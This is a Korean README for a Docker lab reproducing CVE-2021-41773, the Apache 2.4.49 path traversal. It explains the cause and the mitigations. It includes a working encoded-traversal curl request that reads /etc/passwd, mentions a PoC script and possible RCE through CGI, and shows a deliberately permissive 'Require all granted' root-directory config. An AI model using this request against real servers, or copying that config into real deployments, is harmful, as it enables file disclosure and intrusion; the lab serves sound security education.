# CVE-2021-41773 [Apache HTTP Server Path Traversal]

> 화이트햇 스쿨 3기 - [이준영 (@ljyoung04)](https://github.com/ljyoung04)

<br/>

## 요약

- Apache HTTP Server 2.4.49 버전의 경로 정규화 변경 사항에서 결함이 발견되었습니다.
- 이 결함을 사용하여 Path Traversal 공격을 수행하여 Alias와 유사한 지시문으로 구성된 디렉터리 외부의 파일에 접근할 수 있습니다.
- 또한 CGI 스크립트 실행이 활성화되어 있다면 RCE가 가능할 수도 있습니다.
- 실제로 악용된 사례가 있으며 오직 Apache 2.4.49 버전에만 해당됩니다.
- 이 취약점에 대한 수정이 이루어졌지만, 수정이 불완전하여 CVE-2021-42013으로 이어졌습니다.

<br/>

## 환경 구성 및 실행

다음 명령어를 입력하여 취약한 도커 환경을 구축할 수 있습니다.

```
$ sudo docker compose up -d
```

```
$ curl localhost:8080
<meta charset="UTF-8" />
<h1>WHS 3기 이준영</h1>
<h2>CVE-2021-41773 TEST</h2>
$
```

위 처럼 입력했을 때 출력이 같으면 환경이 잘 구축된 것입니다.

아래와 같이 입력하여 Path Traversal 공격을 수행할 수 있습니다.

```
$ curl --path-as-is -v http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

또는 poc.sh를 사용할 수 있습니다.

```
$ ./poc.sh
Usage ./poc.sh <target> <port>

$ ./poc.sh localhost 8080
```

<br/>

## 결과

<img src="https://github.com/ljyoung04/kr-vulhub/blob/main/Apache/CVE-2021-41773/image.png">

<br/>

## 설명

vulhub에 존재하지 않는 CVE 환경을 구축하기 위해 CVE 자료를 찾아보던 중 CVE-2021-41773에 대해 알게 되었고, 이에 대해 조사를 해봤습니다.

CVE-2021-41773은 아파치 HTTP 서버 2.4.49 버전에서만 발생한다는 것을 알게되었고 도커 파일을 작성해 테스트해보게 되었습니다.

따로 이 CVE를 위한 이미지가 존재하지는 않아서 같은 디렉토리에 있는 dockerfile을 빌드해서 사용하도록 docker-compose.yml을 작성했습니다.

HTTP 서버를 바로 가져와서 실행하면 공격이 먹히지 않기 때문에 httpd.conf 파일의 일부분을 다음과 같이 수정해야합니다.

```
<Directory />
    ...
    Require all granted
</Directory>
```

이 지시자의 의미는 모든 사용자에게 루트 디렉토리 접근을 허용한다는 것입니다. 굳이 루트 디렉토리가 아니더라도 접근이 허용되어 있는 디렉토리가 있다면 공격할 수 있습니다.

이 취약점은 아파치 HTTP 서버 버전 2.4.49에서 새로운 경로 정규화를 도입하게 되었는데, URL 매핑 부분에서 인코딩된 문자열을 막지 못했기 때문에 발생했습니다.

curl --path-as-is -v 에서 --path-as-is는 URL 경로를 수정하지 않고 입력한 그대로 사용하라는 의미이고,
-v 옵션은 요청/응답의 자세한 정보를 보여주는 옵션입니다.

또한 서버에서 cgi 스크립트 실행이 허용되어 있다면 cgi-bin 폴더를 사용해 RCE가 가능합니다.
<br/>

## 결론

이 취약점은 Path Traversal을 통해 접근할 수 없는 파일에 접근할 수 있기 때문에, 서버의 중요 정보가 유출될 위험이 있고, 환경에 따라서 RCE가 가능할 수 있기 때문에 매우 위협적인 취약점이다.
이 취약점같은 경우에는 중요 파일들이 있는 디렉토리에 접근을 허용하지 않으면 traversal이 되지 않기 때문에 권한을 최소한으로 하는 것이 중요합니다. 또한 최신 보안 패치를 빠르게 받아 취약점에 대응하는 것도 중요합니다.

## PS.

> Pull Request : https://github.com/gunh0/kr-vulhub/pull/202
